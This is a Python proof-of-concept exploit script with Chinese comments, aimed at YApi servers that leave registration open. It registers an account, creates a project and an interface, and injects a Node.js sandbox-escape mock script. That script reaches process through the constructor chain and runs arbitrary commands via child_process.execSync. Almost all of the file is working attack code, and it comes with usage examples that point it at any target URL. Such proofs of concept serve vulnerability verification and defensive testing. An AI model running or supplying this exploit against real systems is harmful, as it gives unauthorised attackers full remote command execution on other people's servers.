#!/usr/bin/env python3
"""
YApi 开放注册导致Mock脚本沙箱逃逸RCE漏洞 POC
漏洞名称: YApi Open Registration Mock Sandbox Escape RCE
应用版本: YApi (开放注册功能版本)
漏洞等级: 高危

==================== 漏洞描述 ====================
【漏洞原理】
YApi注册功能开启时，攻击者可注册普通用户并创建项目和接口。
YApi的Mock页面允许用户输入JavaScript代码，该代码运行在Node.js沙箱中。
但通过constructor原型链可以逃逸沙箱，获取Node.js process对象，
进而调用child_process.execSync执行任意系统命令。

【影响范围】
- YApi所有开放注册的版本 (测试版本: v1.9.2)
- 需要注册功能开启(默认配置)

【危害等级】
- 需要注册账号（但注册功能通常开放）
- 可完全控制目标服务器
- CVSS评分: 8.8 (High)

==================== 环境要求 ====================
- Python 3.6+
- requests库 (pip install requests)
- 目标: YApi Web端口 (默认3000)
- 目标YApi需开放注册

==================== 验证步骤 ====================
1. 一键检测+利用:
   python yapi_registration_rce.py http://target:3000

2. 指定自定义命令:
   python yapi_registration_rce.py http://target:3000 -c "whoami"

3. 指定注册凭据:
   python yapi_registration_rce.py http://target:3000 -u myuser@test.com -p mypass

4. 仅检测注册功能:
   python yapi_registration_rce.py http://target:3000 --check-only

==================== 预期结果 ====================
- 成功时: 自动注册用户 → 创建项目 → 创建接口 → 注入恶意Mock脚本 → 触发沙箱逃逸RCE → 命令回显
- 失败时: 注册关闭或创建项目失败
"""

import sys
import json
import re
import logging
import argparse
import requests
from typing import Dict, Optional
from urllib.parse import urljoin


class YApiRegistrationRCE:
    """YApi 开放注册Mock沙箱逃逸RCE漏洞验证POC"""

    VULN_NAME = "YApi Open Registration Mock Sandbox Escape RCE"
    VULN_VERSION = "YApi (开放注册版本)"
    SEVERITY = "HIGH"

    # Node.js沙箱逃逸payload
    SANDBOX_ESCAPE_SCRIPT = """const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("%s").toString()
"""

    def __init__(self, target: str, timeout: int = 15, proxy: str = None,
                 verify_ssl: bool = False, email_prefix: str = "yapipoc"):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.verify_ssl = verify_ssl
        self.email_prefix = email_prefix
        self.session = self._create_session()
        self._registered = False
        self._username = ""
        self._password = ""
        self._token = ""
        self._project_id = ""
        self._interface_id = ""

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = self.verify_ssl
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
        })
        if not self.verify_ssl:
            requests.packages.urllib3.disable_warnings()
        return session

    def check(self) -> Dict:
        """
        检测目标是否存在漏洞
        步骤1: 检查目标连通性
        步骤2: 检查注册功能是否开启
        """
        result = {
            "vulnerability": self.VULN_NAME,
            "target": self.target,
            "status": "unknown",
            "details": [],
            "conclusion": ""
        }

        print("[*] 步骤1/2: 检查目标连通性...")
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            if resp.status_code != 200:
                result["status"] = "error"
                result["conclusion"] = f"目标不可达 (HTTP {resp.status_code})"
                return result
            print("[+] 目标可达")
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"目标不可达: {e}"
            return result

        print("[*] 步骤2/2: 检查注册功能...")
        reg_url = urljoin(self.target, '/api/user/reg')
        test_data = {"email": "test_check@vulhub.org", "password": "test123"}
        try:
            resp = self.session.post(reg_url, json=test_data, timeout=self.timeout)
            data = resp.json()
            errcode = data.get('errcode', -1)
            # errcode=40001表示注册关闭, errcode=0表示成功, 其他可能表示开启
            if errcode == 40001:
                result["status"] = "not_vulnerable"
                result["conclusion"] = "注册功能已关闭，目标不受此漏洞影响"
                print("[-] 注册功能已关闭")
            elif errcode == 0 or errcode == 40022:  # 40022=验证码错误(说明功能存在)
                result["status"] = "registration_open"
                result["details"].append("注册功能已开启")
                result["conclusion"] = "注册功能已开启，可进行完整漏洞利用"
                print("[+] 注册功能已开启")
            else:
                result["status"] = "registration_open"
                result["details"].append(f"注册接口存在 (errcode={errcode})")
                result["conclusion"] = "注册接口存在，可尝试利用"
                print(f"[?] 注册接口响应: errcode={errcode}")
        except Exception as e:
            result["status"] = "registration_open"
            result["details"].append(f"注册接口可访问 ({e})")
            result["conclusion"] = "注册接口可访问，可能开放注册"

        return result

    def exploit(self, command: str = "id") -> Dict:
        """
        利用漏洞实现RCE
        步骤1: 注册用户
        步骤2: 登录获取Token
        步骤3: 创建项目
        步骤4: 创建接口
        步骤5: 注入Mock沙箱逃逸脚本
        步骤6: 访问Mock URL触发命令执行
        """
        result = {
            "vulnerability": self.VULN_NAME,
            "target": self.target,
            "command": command,
            "status": "exploiting",
            "details": [],
            "conclusion": ""
        }

        import uuid
        rand_suffix = uuid.uuid4().hex[:6]

        # 步骤1+2: 注册并登录
        print("[*] 步骤1-2/6: 注册用户并登录...")
        if not self._do_register(f"{self.email_prefix}_{rand_suffix}@vulhub.org", "P@ssw0rd123"):
            result["status"] = "failed"
            result["conclusion"] = "注册失败"
            return result
        print(f"[+] 用户注册成功: {self._username}")

        # 步骤3: 创建项目
        print("[*] 步骤3/6: 创建项目...")
        if not self._create_project(f"POC_Project_{rand_suffix}"):
            result["status"] = "failed"
            result["conclusion"] = "创建项目失败"
            return result
        print(f"[+] 项目创建成功, ID: {self._project_id}")

        # 步骤4: 创建接口
        print("[*] 步骤4/6: 创建接口...")
        if not self._create_interface(f"POC_API_{rand_suffix}"):
            result["status"] = "failed"
            result["conclusion"] = "创建接口失败"
            return result
        print(f"[+] 接口创建成功, ID: {self._interface_id}")

        # 步骤5: 注入恶意Mock脚本
        print(f"[*] 步骤5/6: 注入恶意Mock脚本(命令: {command})...")
        mock_url = self._update_mock_script(command)
        if not mock_url:
            result["status"] = "failed"
            result["conclusion"] = "注入Mock脚本失败"
            return result
        result["details"].append(f"Mock URL: {mock_url}")
        print(f"[+] Mock URL: {mock_url}")

        # 步骤6: 触发RCE
        print("[*] 步骤6/6: 访问Mock URL触发RCE...")
        try:
            resp = self.session.get(mock_url, timeout=self.timeout)
            output = resp.text.strip()
            if output:
                result["status"] = "exploited"
                result["output"] = output[:2000]
                result["conclusion"] = f"命令执行成功! 输出: {output[:200]}"
                print(f"[+] 命令输出: {output[:200]}")
            else:
                # 尝试其他方式获取输出
                preview_url = urljoin(self.target, f"/api/interface/get?id={self._interface_id}")
                resp = self.session.get(preview_url, timeout=self.timeout)
                data = resp.json()
                res_body = data.get('data', {}).get('res_body', '') or str(data)[:200]
                result["status"] = "exploited"
                result["output"] = res_body[:2000]
                result["conclusion"] = f"命令可能已执行 (HTTP 200)"
                print(f"[+] Mock接口已触发")
        except Exception as e:
            result["status"] = "warning"
            result["output"] = str(e)
            result["conclusion"] = f"访问Mock URL异常: {e}"

        return result

    def _do_register(self, email: str, password: str) -> bool:
        """注册并登录YApi"""
        # 注册
        reg_url = urljoin(self.target, '/api/user/reg')
        try:
            resp = self.session.post(reg_url, json={"email": email, "password": password},
                                     timeout=self.timeout)
        except Exception:
            return False

        # 无论返回什么，尝试登录
        login_url = urljoin(self.target, '/api/user/login')
        try:
            resp = self.session.post(login_url, json={"email": email, "password": password},
                                     timeout=self.timeout)
            data = resp.json()
            if data.get('errcode') == 0:
                self._username = email
                self._password = password
                self._token = data.get('data', '')
                return True
        except Exception:
            pass
        return False

    def _create_project(self, name: str) -> bool:
        """创建YApi项目"""
        url = urljoin(self.target, '/api/project/add')
        data = {
            "name": name,
            "basepath": f"/{name}",
            "group_id": 1,
            "project_type": "private",
            "switch_notice": False
        }
        try:
            resp = self.session.post(url, json=data, timeout=self.timeout)
            res = resp.json()
            if res.get('errcode') == 0:
                self._project_id = res['data']['_id']
                return True
        except Exception:
            pass
        return False

    def _create_interface(self, name: str) -> bool:
        """创建接口"""
        url = urljoin(self.target, '/api/interface/add')
        data = {
            "title": name,
            "path": f"/{name}",
            "method": "GET",
            "project_id": self._project_id,
            "query_path": {"path": f"/{name}", "params": []},
            "res_body_type": "json",
            "res_body": "{\"result\": \"ok\"}"
        }
        try:
            resp = self.session.post(url, json=data, timeout=self.timeout)
            res = resp.json()
            if res.get('errcode') == 0:
                self._interface_id = res['data']['_id']
                return True
        except Exception:
            pass
        return False

    def _update_mock_script(self, command: str) -> Optional[str]:
        """注入恶意Mock脚本并获取Mock URL"""
        escaped_cmd = command.replace('"', '\\"').replace("'", "\\'")
        script = self.SANDBOX_ESCAPE_SCRIPT % escaped_cmd

        # 更新接口Mock脚本
        url = urljoin(self.target, '/api/interface/up')
        data = {"id": self._interface_id, "project_id": self._project_id, "script": script}
        try:
            resp = self.session.post(url, json=data, timeout=self.timeout)
            res = resp.json()
            if res.get('errcode') != 0:
                return None
        except Exception:
            return None

        # 获取Mock URL
        get_url = urljoin(self.target, f'/api/interface/get?id={self._interface_id}')
        try:
            resp = self.session.get(get_url, timeout=self.timeout)
            res = resp.json()
            if res.get('errcode') == 0:
                data = res.get('data', {})
                project_id = data.get('project_id', self._project_id)
                path = data.get('path', f"/{self._interface_id}")
                return urljoin(self.target, f"/mock/{project_id}{path}")
        except Exception:
            pass

        # 如果无法获取，使用默认格式
        return urljoin(self.target, f"/mock/{self._project_id}/{self._interface_id}")

    def run(self, command: str = "id") -> Dict:
        print(f"[*] {self.VULN_NAME} - 开始验证")
        print(f"[*] 目标: {self.target}")
        print("-" * 60)
        return self.exploit(command)

    def print_result(self, result: Dict):
        status = result.get("status", "unknown")
        icons = {"exploited": "[+]", "vulnerable": "[+]", "failed": "[-]", "error": "[!]", "warning": "[?]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} 漏洞: {result['vulnerability']}")
        print(f"    目标: {result['target']}")
        print(f"    状态: {status}")
        if result.get("command"):
            print(f"    命令: {result['command']}")
        if result.get("output"):
            print(f"    输出: {result['output'][:300]}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


def main():
    parser = argparse.ArgumentParser(
        description="YApi开放注册Mock沙箱逃逸RCE漏洞验证POC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  # 一键检测+利用(注册用户→创建项目→注入脚本→触发RCE)
  python yapi_registration_rce.py http://target:3000

  # 指定自定义命令
  python yapi_registration_rce.py http://target:3000 -c "whoami"

  # 指定注册邮箱前缀
  python yapi_registration_rce.py http://target:3000 -e myprefix

  # 仅检测注册功能
  python yapi_registration_rce.py http://target:3000 --check-only

参数说明:
  target         目标URL (e.g., http://example.com:3000)
  -c, --command  要执行的命令 (默认: id)
  -e, --email    注册邮箱前缀 (默认: yapipoc)
  --check-only   仅检测不利用
  -t, --timeout  请求超时(秒) (默认: 15)
  --proxy        HTTP代理
  -k, --insecure 跳过SSL验证
  -v, --verbose  详细输出
  --output       输出格式 (text/json)

前置条件:
  目标YApi必须开放注册功能（默认配置即开放）
        """
    )
    parser.add_argument("target", help="目标URL (e.g., http://example.com:3000)")
    parser.add_argument("-c", "--command", default="id", help="要执行的命令 (默认: id)")
    parser.add_argument("-e", "--email", default="yapipoc", help="注册邮箱前缀 (默认: yapipoc)")
    parser.add_argument("--check-only", action="store_true", help="仅检测不利用")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="请求超时(秒)")
    parser.add_argument("--proxy", help="HTTP代理")
    parser.add_argument("-k", "--insecure", action="store_true", help="跳过SSL验证")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)

    poc = YApiRegistrationRCE(
        target=args.target, timeout=args.timeout,
        proxy=args.proxy, verify_ssl=not args.insecure,
        email_prefix=args.email
    )

    if args.check_only:
        result = poc.check()
    else:
        result = poc.run(args.command)

    if args.output == "json":
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        poc.print_result(result)


if __name__ == "__main__":
    main()
